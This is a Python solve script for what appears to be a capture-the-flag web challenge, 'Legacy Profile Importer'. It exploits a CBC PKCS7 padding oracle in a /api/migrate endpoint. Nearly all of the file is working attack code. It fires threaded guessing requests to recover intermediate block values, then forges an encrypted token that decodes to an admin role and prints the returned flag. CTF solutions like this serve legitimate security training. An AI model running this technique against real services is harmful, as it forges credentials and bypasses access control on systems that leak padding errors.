#!/usr/bin/env python3
"""CBC padding-oracle solve for Legacy Profile Importer.

The migrate endpoint distinguishes three error modes:
  200 - padding valid, JSON valid                  (success message)
  400 - padding valid, JSON invalid                ("profile data is unreadable")
  500 - padding invalid                            ("Token corrupted, invalid padding")
That last distinction is a classic PKCS7 padding oracle. We use it to encrypt
an arbitrary plaintext (CBC-R) that decodes to {"role":"admin"} with a proper
PKCS7 pad block. No plaintext assumption is required.
"""
import base64, json, re, sys, time
import concurrent.futures as cf
import threading

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


def get_session():
    s = requests.Session()
    retry = Retry(total=8, backoff_factor=0.3,
                  status_forcelist=[502, 503, 504],
                  allowed_methods=frozenset(["POST", "GET"]))
    s.mount("http://", HTTPAdapter(pool_connections=32, pool_maxsize=32,
                                   max_retries=retry))
    return s


_tls = threading.local()
def sess():
    s = getattr(_tls, "s", None)
    if s is None:
        s = get_session()
        _tls.s = s
    return s


def fetch_token(base_url):
    """Pull the assigned V1 migration token from the landing page."""
    html = sess().get(base_url + "/", timeout=15).text
    m = re.search(r'id="starterToken">([A-Za-z0-9+/=]+)<', html)
    if not m:
        raise SystemExit("could not find starterToken on landing page")
    return m.group(1)


def query(base_url, token_bytes):
    tok = base64.b64encode(token_bytes).decode()
    for attempt in range(6):
        try:
            r = sess().post(base_url + "/api/migrate",
                            json={"token": tok}, timeout=15)
            return r.status_code, r.text
        except (requests.ConnectionError, requests.Timeout):
            time.sleep(0.2 * (attempt + 1))
    raise RuntimeError("gave up on request")


def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def decrypt_block(base_url, cipher_block, workers=12):
    """Return I = D(cipher_block) using the padding oracle."""
    intermediate = bytearray(16)
    for pos in range(15, -1, -1):
        pad_val = 16 - pos
        suffix = bytes(intermediate[j] ^ pad_val for j in range(pos + 1, 16))
        prefix = bytes(pos)

        candidates = list(range(256))
        hits = []
        with cf.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = {ex.submit(query, base_url,
                              prefix + bytes([g]) + suffix + cipher_block): g
                    for g in candidates}
            for fut in cf.as_completed(futs):
                code, _ = fut.result()
                if code != 500:
                    hits.append(futs[fut])

        found = None
        if pos == 15 and len(hits) > 1:
            # Disambiguate against a natural longer-pad collision by flipping
            # IV[14]: a real 0x01 pad stays valid, an accidental 0x02..0x10
            # collision breaks.
            for g in hits:
                iv = bytes(14) + bytes([1]) + bytes([g]) + cipher_block
                code, _ = query(base_url, iv)
                if code != 500:
                    found = g
                    break
        elif hits:
            found = hits[0]

        if found is None:
            raise RuntimeError(f"no valid pad at pos {pos}")

        intermediate[pos] = found ^ pad_val
        print(f"  pos {pos:2d}: I={intermediate[pos]:#04x}", file=sys.stderr)
    return bytes(intermediate)


def main():
    if len(sys.argv) < 2:
        raise SystemExit("usage: solve.py <base_url>")
    base = sys.argv[1].rstrip("/")

    print(f"[*] target: {base}", file=sys.stderr)
    token = fetch_token(base)
    print(f"[*] fetched starter token: {token}", file=sys.stderr)

    orig = base64.b64decode(token)
    if len(orig) != 64:
        raise SystemExit(f"expected 64 bytes, got {len(orig)}")

    # Target plaintext: {"role":"admin"} + PKCS7 pad (0x10 * 16).
    TARGET_P0 = b'{"role":"admin"}'
    TARGET_P1 = b"\x10" * 16

    # Reuse any original block as Y2.
    Y2 = orig[48:64]

    print("[*] padding-oracle decrypt Y2 (pad block)…", file=sys.stderr)
    t0 = time.time()
    I2 = decrypt_block(base, Y2)
    print(f"[*] Y2 done in {time.time()-t0:.1f}s", file=sys.stderr)

    Y1 = xor(I2, TARGET_P1)

    print("[*] padding-oracle decrypt Y1 (content block)…", file=sys.stderr)
    t0 = time.time()
    I1 = decrypt_block(base, Y1)
    print(f"[*] Y1 done in {time.time()-t0:.1f}s", file=sys.stderr)

    Y0 = xor(I1, TARGET_P0)
    forged = Y0 + Y1 + Y2
    forged_b64 = base64.b64encode(forged).decode()
    print(f"[*] forged token: {forged_b64}", file=sys.stderr)

    code, body = query(base, forged)
    print(f"HTTP {code} {body}")

    m = re.search(r"LYKNCTF\{[^}]+\}", body)
    if m:
        print(m.group(0))


if __name__ == "__main__":
    main()
